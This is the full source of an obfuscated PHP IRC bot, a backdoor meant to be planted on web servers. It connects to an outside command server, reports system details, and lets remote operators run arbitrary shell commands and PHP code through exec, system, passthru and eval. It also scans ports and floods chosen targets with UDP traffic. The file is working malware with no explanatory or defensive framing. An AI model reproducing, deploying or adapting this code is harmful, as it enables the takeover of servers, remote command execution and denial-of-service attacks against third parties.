<?php set_time_limit(0); error_reporting(0);  class frNnJZjrvfnZrJNbb {

 var $zjRrZRRvFbRjvJR = array("nvbvrnNNVzjjJvnj"=>"gang.sexpil.net",
                     "vZzN"=>"25343",
                     "vnbRV"=>"scary",
                     "FFbBnr"=>"13",
                     "tdLhD"=>"#wWw#",
                     "BZZ"=>"scan",
                     "NjzNZVzzj"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "VbRvFbnrjJ"=>".",
                     "BjrvvvrrJVf"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $nZrvfZnRnbVFRfnfJV = array(); 
 function umIIUqmyyYMy($LLHD) 
 { 
    if(isset($this->nZrvfZnRnbVFRfnfJV[$LLHD])) 
       return 1; 
    else 
       return 0; 
 } function QMYmIYaYUeqiYIYuua($LLHD,$tHLhDDPXdd,$auqu) {
	$this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"[\002UdpFlood Gestart!\002]"); 
	$TDpXlxXlt = "";
	for($p=0;$p<$tHLhDDPXdd;$p++) { $TDpXlxXlt .= chr(mt_rand(1,256)); }
	$PdLpx = time();
	$p = 0;
	while(time()-$PdLpx < $auqu) {
		$zP=fsockopen("udp://".$LLHD,mt_rand(0,6000),$e,$s,5);
      	fwrite($zP,$TDpXlxXlt);
       	fclose($zP);
		$p++;
	}
	$ZWP = $p * $tHLhDDPXdd;
	$ZWP = $ZWP / 1048576;
	$PfK = $ZWP / $auqu;
	$PfK = round($PfK);
	$ZWP = round($ZWP);
	$this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"[\002UdpFlood Afgerond!\002]: $ZWP MB verzonden / gemiddelde: $PfK MB/s ");
 } function iumMUmemqMyyYQMuEUq() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $dTpxHPXThpx = "\0034ON\003"; } else { $dTpxHPXThpx = "\0039OFF\003"; }

	$THtTlPDt = php_uname();
	if($THtTlPDt == "") { $rZwSLX = "\00315---\003"; } else { $rZwSLX = "\00315".$THtTlPDt."\003"; }
		 
	 $Vncw = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $DHsSC =  getcwd()."";
	 
	 $LsKw = "\00315".$DHsSC."\003";

	$kWKkwooWSS = fileperms("$DHsSC");

	if (($kWKkwooWSS & 0xC000) == 0xC000) { $occswkKkwoO = 's';
	} elseif (($kWKkwooWSS & 0xA000) == 0xA000) { $occswkKkwoO = 'l';
	} elseif (($kWKkwooWSS & 0x8000) == 0x8000) { $occswkKkwoO = '-';
	} elseif (($kWKkwooWSS & 0x6000) == 0x6000) { $occswkKkwoO = 'b';
	} elseif (($kWKkwooWSS & 0x4000) == 0x4000) { $occswkKkwoO = 'd';
	} elseif (($kWKkwooWSS & 0x2000) == 0x2000) { $occswkKkwoO = 'c';
	} elseif (($kWKkwooWSS & 0x1000) == 0x1000) { $occswkKkwoO = 'p';
	} else { $occswkKkwoO = 'u'; }

	$occswkKkwoO .= (($kWKkwooWSS & 0x0100) ? 'r' : '-');
	$occswkKkwoO .= (($kWKkwooWSS & 0x0080) ? 'w' : '-');
	$occswkKkwoO .= (($kWKkwooWSS & 0x0040) ?	(($kWKkwooWSS & 0x0800) ? 's' : 'x' ) :	(($kWKkwooWSS & 0x0800) ? 'S' : '-'));

	$occswkKkwoO .= (($kWKkwooWSS & 0x0020) ? 'r' : '-');
	$occswkKkwoO .= (($kWKkwooWSS & 0x0010) ? 'w' : '-');
	$occswkKkwoO .= (($kWKkwooWSS & 0x0008) ?	(($kWKkwooWSS & 0x0400) ? 's' : 'x' ) :	(($kWKkwooWSS & 0x0400) ? 'S' : '-'));

	$occswkKkwoO .= (($kWKkwooWSS & 0x0004) ? 'r' : '-');
	$occswkKkwoO .= (($kWKkwooWSS & 0x0002) ? 'w' : '-');
	$occswkKkwoO .= (($kWKkwooWSS & 0x0001) ?	(($kWKkwooWSS & 0x0200) ? 't' : 'x' ) :	(($kWKkwooWSS & 0x0200) ? 'T' : '-'));
			
	$VnTL = "\00315".$occswkKkwoO."\003";

	$this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"\00314[SAFE:\003\002 $dTpxHPXThpx\002\00314]\00315 $Vncw \00314[pwd:]\00315 $LsKw \00314(\003$VnTL\00314) [uname:]\00315 $rZwSLX");
 } function aeEaMYYymmYEUqQq() {
  $TPlXph = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $XdphDhX = strlen($TPlXph);
  for($p=0;$p<$this->zjRrZRRvFbRjvJR['FFbBnr'];$p++) {
	$EEM .= $TPlXph[rand(0,$XdphDhX-1)];
  }
  $this->EAAQmuE("NICK ".$EEM."");
 } function eAEUMuUm($LLHD) 
 { 
    unset($this->nZrvfZnRnbVFRfnfJV[$LLHD]); 
 } function uyUqAq($tdLhD,$BZZ=NULL) 
 { 
    $this->EAAQmuE("JOIN $tdLhD $BZZ"); 
 } function uUMEieEeI($LLHD) 
 { 
    $this->nZrvfZnRnbVFRfnfJV[$LLHD] = true; 
 } function mYuqaYYuIqm($Ht,$xXD)
 {
    $this->EAAQmuE("PRIVMSG $Ht :$xXD");
 } function myMEmyMAyyuUEEMIM() {
  $TPlXph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $XdphDhX = strlen($TPlXph);
  for($p=0;$p<6;$p++) {
	$EEM .= $TPlXph[rand(0,$XdphDhX-1)];
  }
  if(php_uname() == "") { $THtTlPDt = "---"; } else { $THtTlPDt = php_uname(); }
  $this->EAAQmuE("USER ".$EEM."-go 127.0.0.1 localhost :".$THtTlPDt."");
 } function EUUmqqYQeUMYY() 
 { 
    if(!($this->KKkWKoGSo = fsockopen($this->zjRrZRRvFbRjvJR['nvbvrnNNVzjjJvnj'],$this->zjRrZRRvFbRjvJR['vZzN'],$e,$s,30))) 
    $this->EUUmqqYQeUMYY(); 
    $this->myMEmyMAyyuUEEMIM();
    if(strlen($this->zjRrZRRvFbRjvJR['vnbRV'])>0) 
    $this->EAAQmuE("PASS ".$this->zjRrZRRvFbRjvJR['vnbRV']);
    $this->aeEaMYYymmYEUqQq();
    $this->IuqQMeMAmuUEIU();
 } function EAAQmuE($xXD) 
 { 
    fwrite($this->KKkWKoGSo,"$xXD\r\n"); 
 } function MAIeUIyYIy($Ht,$xXD)
 {
    $this->EAAQmuE("NOTICE $Ht :$xXD");
 }function IuqQMeMAmuUEIU() 
 { 
    while(!feof($this->KKkWKoGSo)) 
    { 
       $this->UAYae = trim(fgets($this->KKkWKoGSo,512)); 
       $jFrJrnbRnnJrb = explode(" ",$this->UAYae); 
       if(substr($this->UAYae,0,6)=="PING :") 
       { 
          $this->EAAQmuE("PONG :".substr($this->UAYae,6)); 
       } 
       if(isset($jFrJrnbRnnJrb[1]) && $jFrJrnbRnnJrb[1] =="004") 
       { 
          $this->EAAQmuE("JOIN ".$this->zjRrZRRvFbRjvJR['tdLhD']." ".$this->zjRrZRRvFbRjvJR['BZZ']."");
          $this->uyUqAq($this->zjRrZRRvFbRjvJR['tdLhD'],$this->zjRrZRRvFbRjvJR['BZZ']);
          $this->iumMUmemqMyyYQMuEUq();
       } 
       if(isset($jFrJrnbRnnJrb[1]) && $jFrJrnbRnnJrb[1]=="433") 
       { 
          $this->aeEaMYYymmYEUqQq(); 
       }
       if($this->UAYae != $nZZ_LpH) 
       { 
          $FvFVNRbNBVJZnz = array(); 
          $Ckk = substr(strstr($this->UAYae," :"),2); 
          $OcOC = explode(" ",$Ckk); 
          $cggCW = explode("!",$jFrJrnbRnnJrb[0]); 
          $gOSwKw = explode("@",$cggCW[1]); 
          $gOSwKw = $gOSwKw[1]; 
          $cggCW = substr($cggCW[0],1); 
          $WWOkwgo = $jFrJrnbRnnJrb[0]; 
          if($OcOC[0]==$this->cggCW) 
          { 
           for($p=0;$p<count($OcOC);$p++) 
              $FvFVNRbNBVJZnz[$p] = $OcOC[$p+1]; 
          } 
          else 
          { 
           for($p=0;$p<count($OcOC);$p++) 
              $FvFVNRbNBVJZnz[$p] = $OcOC[$p]; 
          } 
          if(count($jFrJrnbRnnJrb)>2) 
          { 
             switch($jFrJrnbRnnJrb[1]) 
             { 
                case "QUIT": 
                   if($this->umIIUqmyyYMy($WWOkwgo)) 
                   { 
                      $this->eAEUMuUm($WWOkwgo); 
                   } 
                break; 
                case "PART": 
                   if($this->umIIUqmyyYMy($WWOkwgo)) 
                   { 
                      $this->eAEUMuUm($WWOkwgo); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->umIIUqmyyYMy($WWOkwgo) && (md5($gOSwKw) == $this->zjRrZRRvFbRjvJR['BjrvvvrrJVf'] || $this->zjRrZRRvFbRjvJR['BjrvvvrrJVf'] == "*")) 
                   { 
                      if(substr($FvFVNRbNBVJZnz[0],0,1)==$this->zjRrZRRvFbRjvJR['VbRvFbnrjJ']) 
                      { 
                         switch(substr($FvFVNRbNBVJZnz[0],1)) 
                         { 
                            case "user": 
                              if(md5($FvFVNRbNBVJZnz[1])==$this->zjRrZRRvFbRjvJR['NjzNZVzzj']) 
                              { 
                                 $this->uUMEieEeI($WWOkwgo);
                              } 
                              else 
                              { 
                                 $this->MAIeUIyYIy($this->zjRrZRRvFbRjvJR['tdLhD'],"[\002Auth\002]: Fout password $cggCW idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->umIIUqmyyYMy($WWOkwgo)) 
                   { 
                      if(substr($FvFVNRbNBVJZnz[0],0,1)==$this->zjRrZRRvFbRjvJR['VbRvFbnrjJ']) 
                      { 
                         switch(substr($FvFVNRbNBVJZnz[0],1)) 
                         {                            case "sexec":
                               $CwGswosWOKgk = substr(strstr($Ckk,$FvFVNRbNBVJZnz[0]),strlen($FvFVNRbNBVJZnz[0])+1); 
                               $SwCGcWCCskkGW = shell_exec($CwGswosWOKgk); 
                               $gOkOgcoggkgWgc = explode("\n",$SwCGcWCCskkGW); 
                               for($p=0;$p<count($gOkOgcoggkgWgc);$p++) 
                                  if($gOkOgcoggkgWgc[$p]!=NULL) 
                                     $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"      : ".trim($gOkOgcoggkgWgc[$p])); 
                            break;                            case "logout": 
                               $this->eAEUMuUm($WWOkwgo); 
                               $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"[\002Auth\002]\00314 Je bent nu uitgelogt $cggCW"); 
                            break;                            case "passthru": 
                               $CwGswosWOKgk = substr(strstr($Ckk,$FvFVNRbNBVJZnz[0]),strlen($FvFVNRbNBVJZnz[0])+1); 

                               $SwCGcWCCskkGW = passthru($CwGswosWOKgk); 
                               $gOkOgcoggkgWgc = explode("\n",$SwCGcWCCskkGW); 
                               for($p=0;$p<count($gOkOgcoggkgWgc);$p++) 
                                  if($gOkOgcoggkgWgc[$p]!=NULL) 
                                     $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"      : ".trim($gOkOgcoggkgWgc[$p])); 
                            break;                            case "pscan": 
                               if(count($FvFVNRbNBVJZnz) > 2) 
                               { 
                                  if(fsockopen($FvFVNRbNBVJZnz[1],$FvFVNRbNBVJZnz[2],$e,$s,15)) 
                                     $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"[\002pscan\002]: ".$FvFVNRbNBVJZnz[1].":".$FvFVNRbNBVJZnz[2]." is \2open\2"); 
                                  else 
                                     $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"[\002pscan\002]: ".$FvFVNRbNBVJZnz[1].":".$FvFVNRbNBVJZnz[2]." is \2closed\2"); 
                               } 
                            break;                            case "die": 
                               $this->EAAQmuE("QUIT :die command from $cggCW");
                               fclose($this->KKkWKoGSo); 
                               exit;                            case "dns": 
                               if(isset($FvFVNRbNBVJZnz[1])) 
                               { 
                                  $KS = explode(".",$FvFVNRbNBVJZnz[1]); 
                                  if(count($KS)==4 && is_numeric($KS[0]) && is_numeric($KS[1]) && is_numeric($KS[2]) && is_numeric($KS[3])) 
                                  { 
                                     $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"[\002dns\002]: ".$FvFVNRbNBVJZnz[1]." => ".gethostbyaddr($FvFVNRbNBVJZnz[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"[\002dns\002]: ".$FvFVNRbNBVJZnz[1]." => ".gethostbyname($FvFVNRbNBVJZnz[1])); 
                                  } 
                               } 
                            break;                            case "info":
                               $this->iumMUmemqMyyYQMuEUq();
                            break;                            case "eval":
                              $eval = eval(substr(strstr($Ckk,$FvFVNRbNBVJZnz[1]),strlen($FvFVNRbNBVJZnz[1])));
                            break;                            case "raw":
                               $this->EAAQmuE(strstr($Ckk,$FvFVNRbNBVJZnz[1])); 
                            break;                            case "restart": 
                               $this->EAAQmuE("QUIT :gerestart door $cggCW");
                               fclose($this->KKkWKoGSo); 
                               $this->EUUmqqYQeUMYY(); 
                            break;                            case "udpflood": 
                               if(count($FvFVNRbNBVJZnz)>3) 
                               { 
                                  $this->QMYmIYaYUeqiYIYuua($FvFVNRbNBVJZnz[1],$FvFVNRbNBVJZnz[2],$FvFVNRbNBVJZnz[3]); 
                               } 
                            break;                            case "system": 
                               $CwGswosWOKgk = substr(strstr($Ckk,$FvFVNRbNBVJZnz[0]),strlen($FvFVNRbNBVJZnz[0])+1); 
                               $SwCGcWCCskkGW = system($CwGswosWOKgk); 
                               $gOkOgcoggkgWgc = explode("\n",$SwCGcWCCskkGW); 
                               for($p=0;$p<count($gOkOgcoggkgWgc);$p++) 
                                  if($gOkOgcoggkgWgc[$p]!=NULL) 
                                     $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"      : ".trim($gOkOgcoggkgWgc[$p])); 
                            break;                            case "rndnick": 
                               $this->aeEaMYYymmYEUqQq(); 
                            break;                            case "exec": 
                               $CwGswosWOKgk = substr(strstr($Ckk,$FvFVNRbNBVJZnz[0]),strlen($FvFVNRbNBVJZnz[0])+1); 
                               $SwCGcWCCskkGW = exec($CwGswosWOKgk); 
                               $gOkOgcoggkgWgc = explode("\n",$SwCGcWCCskkGW); 
                               for($p=0;$p<count($gOkOgcoggkgWgc);$p++) 
                                  if($gOkOgcoggkgWgc[$p]!=NULL) 
                                     $this->mYuqaYYuIqm($this->zjRrZRRvFbRjvJR['tdLhD'],"      : ".trim($gOkOgcoggkgWgc[$p])); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $nZZ_LpH = $this->UAYae; 
    } 
    $this->EUUmqqYQeUMYY(); 
 }}
$OOGsWWWK = new frNnJZjrvfnZrJNbb;
$OOGsWWWK->EUUmqqYQeUMYY(); ?>